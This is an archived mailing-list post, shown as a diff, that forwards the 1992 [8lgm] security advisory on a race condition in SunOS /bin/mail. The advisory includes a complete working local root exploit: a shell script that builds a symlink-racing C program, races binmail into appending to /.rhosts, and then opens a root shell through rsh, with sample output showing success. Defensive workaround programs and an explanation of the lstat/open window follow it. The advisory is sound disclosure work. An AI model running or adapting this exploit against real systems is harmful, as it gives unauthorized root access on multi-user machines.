@@ -1,0 +1,414 @@
+It's a very very old hole in /bin/mail that allows race conditions in
+which .rhosts files can be created...
+
+I would have thought this was fixed by 2.5, but it wasn't. My boss just a
+few minutes ago exploited it on a sol2.5 machine.
+
+===========================================================================
+                [8lgm]-Advisory-5.UNIX.mail.24-Jan-1992
+
+PROGRAM:
+
+        binmail(1)        (/usr/bin/mail)
+
+VULNERABLE OS's:
+
+        SunOS 4.1.x
+
+        (Possibly other platforms - see DISCUSSION)
+
+DESCRIPTION:
+
+        A race condition exists in binmail(1), which allows files to
+        be created in arbitrary places on the filesystem.  These files
+        can be owned by arbitrary (usually system) users.
+
+IMPACT:
+
+        Any user with access to binmail(1) can become root.
+
+REPEAT BY:
+
+        This example demonstrates how to become root on most affected
+        machines by creating/appending-to root's .rhosts file.  Please
+        do not do this unless you have permission.
+
+        Create the following file, 'mailscript':
+
+8<--------------------------- cut here ----------------------------
+#!/bin/sh
+#
+# Syntax: mailscript user target-file rsh-user
+#
+# This exploits a flaw in SunOS binmail(1), and attempts
+# to become the specified 'user', by creating a .rhosts
+# file and using rsh.
+#
+# Written 1992 by [8LGM]
+# Please do not use this script without permission.
+#
+PATH=/usr/ucb:/usr/bin:/bin      export PATH
+IFS=" "                          export IFS
+
+PROG="`basename $0`"
+SPOOLDIR="/var/spool/mail"
+
+# Check args
+if [ $# -ne 3 ]; then
+        echo "Syntax: $PROG user target-file rsh-user"
+        exit 1
+fi
+TARGET="$1"
+TARGET_FILE="$2"
+RSH_USER="$3"
+
+# Check we're on SunOS
+if [ "x`uname -s`" != "xSunOS" ]; then
+        echo "Sorry, this only works on SunOS"
+        exit 1
+fi
+
+# Check user exists
+grep "^$TARGET:" /etc/passwd >/dev/null 2>&1
+if [ $? -ne 0 ]; then
+        echo "$PROG: Warning, $TARGET not in local passwd file"
+        # We continue though, might be in the YP passwd file
+fi
+
+# Check target file
+if [ -f $TARGET_FILE ]; then
+        OLD_TARGET_LEN=`ls -ld $TARGET_FILE | awk -F' ' '{print $4}'` 2>/dev/null
+        echo "$PROG: Warning, $TARGET_FILE already exists, appending"
+else
+        OLD_TARGET_LEN=0
+fi
+
+# Delete spool file if its a link, and we are able
+if [ -h "$SPOOLDIR/$TARGET" ]; then
+        rm -f "$SPOOLDIR/$TARGET"
+        # Dont worry about errors, we catch it below
+fi
+
+# Check mail file
+if [ -f "$SPOOLDIR/$TARGET" ]; then
+        echo "$PROG: ${TARGET}'s mail file exists."
+        exit 1
+fi
+
+# Make the race program
+cat >mailrace.c << 'EOF'
+#include <stdio.h>
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+        if (argc != 3) {
+                fprintf(stderr, "Usage: %s mailfile newfile\n", argv[0]);
+                exit(1);
+        }
+
+        for (;;) {
+                unlink(argv[1]);
+                symlink(argv[2], argv[1]);
+        }
+}
+EOF
+cc -o mailrace mailrace.c
+
+# Check we now have mailrace
+if [ ! -x "mailrace" ]; then
+        echo "$PROG: couldnt compile mailrace.c - check it out"
+        exit 1
+fi
+
+# Start mailrace
+./mailrace $SPOOLDIR/$TARGET $TARGET_FILE &
+RACE_PID=$!
+
+# Send mail to the user
+NEW_TARGET_LEN=$OLD_TARGET_LEN
+while [ "x$NEW_TARGET_LEN" = "x$OLD_TARGET_LEN" ]; do
+        echo "Sending mail to $TARGET"
+        echo "localhost $USER" | /bin/mail $TARGET
+        sleep 10
+        kill -STOP $RACE_PID
+        rm -f $SPOOLDIR/$TARGET >/dev/null 2>&1
+        if [ -f $SPOOLDIR/$TARGET ]; then
+                echo "$PROG: Sorry, we lost the race - cant try again."
+                kill -9 $RACE_PID
+                exit 1
+        fi
+        kill -CONT $RACE_PID
+        if [ -f "$TARGET_FILE" ]; then
+                NEW_TARGET_LEN=`ls -ld $TARGET_FILE | awk -F' ' '{print $4}'` 2>/dev/null
+        else
+                NEW_TARGET_LEN=0
+        fi
+        if [ "x$NEW_TARGET_LEN" = "x$OLD_TARGET_LEN" ]; then
+                echo "We drew the race that time, trying again"
+        fi
+done
+
+# We won the race
+kill -9 $RACE_PID
+echo "We won the race, becoming $RSH_USER"
+rsh localhost -l $RSH_USER sh -i
+exit 0
+8<--------------------------- cut here ----------------------------
+
+        (Lines marked with > represent user input)
+
+Check what root users are on the system:
+
+>       % grep :0: /etc/passwd
+        root:*:0:1:Operator:/:/bin/csh
+        sysdiag:*:0:1:Old System Diagnostic:/usr/diag/sysdiag:/usr/diag/sysdiag/sysdiag
+        sundiag:*:0:1:System Diagnostic:/usr/diag/sundiag:/usr/diag/sundiag/sundiag
+        +::0:0:::
+
+We choose a user with UID 0, but without a /var/spool/mail/<username> file:
+
+>       % ls -l /var/spool/mail/sysdiag
+        /var/spool/mail/sysdiag not found
+
+Execute mailscript.  The user is sysdiag, the target file is /.rhosts, and
+the user to rsh to on success is root:
+
+>       % chmod 700 mailscript
+>       % ./mailscript sysdiag /.rhosts root
+        mailscript: Warning, /.rhosts already exists, appending
+        Sending mail to sysdiag
+        We won the race, becoming root
+        ./mailscript: 11051 Killed
+        #
+
+DISCUSSION:
+
+        This problem exists because /var/spool/mail is rwxrwxrwt. (Other
+        systems have their spool dir rwxrwxr-x, and run their MUA's sgid
+         mail).  Before it opens the mail file, binmail does an lstat(2)
+        to check that it is not about to write to a linked file.  The
+        intention is to prevent arbitrary files from being created or
+        appended to.
+
+        However, there exists a window of opportunity between lstat(2)
+        and open(2); if a link is created after lstat, open will then
+        follow the link.  This is not a straightforward task, as it is
+        not possible to predict when to create the link.
+
+        Therefore it is necessary to have a program (mailrace) which
+        continually creates links and then removes them.  To exploit the
+        window of opportunity, it is required that the link has been
+        removed before the context switch for lstat, but exists for open.
+        There are three possible outcomes for this race:-
+
+        1) lstat finds a link - mail returned to sender.
+
+        2) link does not exist for lstat, but does for open - file
+           created - we win.
+
+        3) link does not exist for lstat or open - mailbox created.
+           In this case, it is not possible to remove the mailbox
+           (as the stick bit is set on /var/spool/mail), so it is
+           necessary to choose another target user.
+
+        In tests, it would appear that the chances of 1) and 2)
+        occurring are approximately equal, with the chance of 3) being
+        somewhat lower.
+
+        Please note that this vulnerability may exist on other
+        platforms where the mail spool directory has mode 777 and
+        /bin/mail is setuid root.
+
+WORKAROUND & FIX:
+
+        1. Contact your vendor for a patch.
+
+        2. We have considered several potential workarounds for this
+           vulnerability.  The ideal fix would be to remove global write
+           access to the mail spool directory.  However, this is not
+           possible as programs such as /bin/mail, /usr/ucb/Mail and
+           elm require everyone to have write access.  Also it is not
+           possible to, for example, change the group ownership of
+           /var/spool/mail to mail and give /bin/mail and /usr/ucb/Mail
+           setgid mail privilege, as they do not reset their group id
+           before forking a shell.
+
+           We have therefore decided that the following is the only
+           viable method:
+
+           i. Ensure that every user maintains a mailbox file.  The
+              following program will create a mailbox for every user
+              on the system, if one does not currently exist.
+
+8<--------------------------- cut here ----------------------------
+/*
+ * makemailboxes.c
+ *
+ * Written 1994 by [8LGM]
+ *
+ * This program is part of a workaround for the SunOS 4.1.x /bin/mail
+ * bug described in the 8LGM Advisory.  This program should be executed
+ * as root, and will create a mailbox for each user that doesnt have one.
+ * In order for this workaround to be effective, /usr/ucb/Mail also needs
+ * to be wrapped with wrapper.c.
+ */
+
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/param.h>
+#include <sys/file.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <pwd.h>
+
+#define MAIL_SPOOL_DIR "/var/spool/mail"
+
+main(argc, argv)
+int argc;
+char *argv[];
+{
+        int    fd;
+        char   path[MAXPATHLEN + 5];
+        struct passwd *pw;
+
+        umask(0);
+        setpwent();
+        while (pw = getpwent()) {
+                sprintf(path, "%s/%s", MAIL_SPOOL_DIR, pw->pw_name);
+                if (access(path, F_OK)) {
+                        if ((fd = open(path,O_CREAT|O_EXCL|O_WRONLY, 0600)) < 0)
+                                perror("open");
+                        else {
+                                if (fchown(fd, pw->pw_uid, pw->pw_gid))
+                                        perror("fchown");
+                                close(fd);
+                                printf("Created %s\n", path);
+                        }
+                }
+        }
+        endpwent();
+        exit(0);
+}
+8<--------------------------- cut here ----------------------------
+
+           ii. /usr/ucb/Mail removes the mailbox file if all mail has
+               been read, and the user is not preserving the contents.
+               Therefore, we would recommend using the following wrapper
+               for Mail, which creates the user's mailbox if it has been
+               removed.
+
+8<--------------------------- cut here ----------------------------
+/*
+ * wrapper.c
+ *
+ * Written 1994 by [8LGM]
+ *
+ * This program is part of a workaround for the SunOS 4.1.x /bin/mail
+ * bug described in the 8LGM Advisory.  Programs such as /usr/ucb/Mail
+ * that will delete the user's mailbox when he/she has no mail need to
+ * be wrapped with this.
+ *
+ * Install as follows:
+ *
+ *        # cc -O -o wrapper wrapper.c
+ *        # mv /usr/ucb/Mail /usr/ucb/Mail.old
+ *        # mv /usr/ucb/mail /usr/ucb/mail.old
+ *        # cp wrapper /usr/ucb/Mail
+ *        # chmod 755 /usr/ucb/Mail
+ *        # ln /usr/ucb/Mail /usr/ucb/mail
+ *
+ * DO NOT INSTALL THIS PROGRAM SET-UID/SET-GID ANYTHING.
+ */
+
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/param.h>
+#include <sys/file.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <pwd.h>
+
+#define MAIL_SPOOL_DIR "/var/spool/mail"
+
+main(argc, argv)
+int argc;
+char *argv[];
+{
+        pid_t  pid;
+        int    status, fd;
+        char   path[MAXPATHLEN + 5], *user;
+        struct passwd *pw;
+
+        if ((pid = fork()) == -1) {
+                perror("fork");
+                exit(1);
+        }
+
+        sprintf(path, "%s.old", argv[0]);
+        if (pid == 0) {
+                execvp(path, argv);
+                perror("execvp");
+                exit(1);
+        }
+
+        setuid(getuid());     /* Just in case we're suid,
+                                 which we shouldnt be */
+        if (waitpid(pid, &status, 0) == -1) {
+                perror("waitpid");
+                exit(1);
+        }
+
+        if ((user = (char*)getenv("USER")) == NULL) {
+                if ((pw = getpwuid(getuid())) == NULL) {
+                        fprintf(stderr, "Who are you?!");
+                        exit(1);
+                }
+                user = pw->pw_name;
+        }
+        sprintf(path, "%s/%s", MAIL_SPOOL_DIR, user);
+        if (access(path, F_OK)) {
+                if ((fd = open(path, O_CREAT|O_EXCL|O_WRONLY, 0600)) < 0)
+                        perror("open");
+                else
+                        close(fd);
+        }
+        exit(status);
+}
+8<--------------------------- cut here ----------------------------
+
+FEEDBACK AND CONTACT INFORMATION:
+
+        8lgm-bugs@bagpuss.demon.co.uk           (To report security flaws)
+
+        8lgm-request@bagpuss.demon.co.uk        (Request for [8lgm] Advisories)
+
+        8lgm@bagpuss.demon.co.uk                (General enquiries)
+
+        System Administrators are encouraged to contact us for any
+        other information they may require about the problems described
+        in this advisory.
+
+        We welcome reports about which platforms this flaw does or does
+        not exist on.
+
+        NB: 8lgm-bugs@bagpuss.demon.co.uk is intended to be used by
+        people wishing to report which platforms/OS's the bugs in our
+        advisories are present on.  Please do *not* send information on
+        other bugs to this address - report them to your vendor and/or
+        comp.security.unix instead.
+===========================================================================
+
+              -----/'[/'[/'[Andy Dills]'\]'\]'\-----
+ "Founding member of the Frednet.Support"   Phear the big BEAVIS!
+"_THIS_ is my BOOM stick!!!!"  --   That Guy from Army of Darkness
+ Work:andy@fred.net---------->(BOFH)<--------Play:andy@beavis.net
+        All things BSDish. If it's not BSDish, it's CRAP!
+                Andy's Made Up Quote of The Week:
+      "To understand solaris2.5, one must suffer and RTFM."
+
+   * Next message: Casper Dik: "Re: Solaris mailx hole"
+   * Previous message: Marc Mosko/jfrank/us: "Solaris mailx hole"
+   * In reply to: Marc Mosko/jfrank/us: "Solaris mailx hole"
+   * Next in thread: Casper Dik: "Re: Solaris mailx hole"
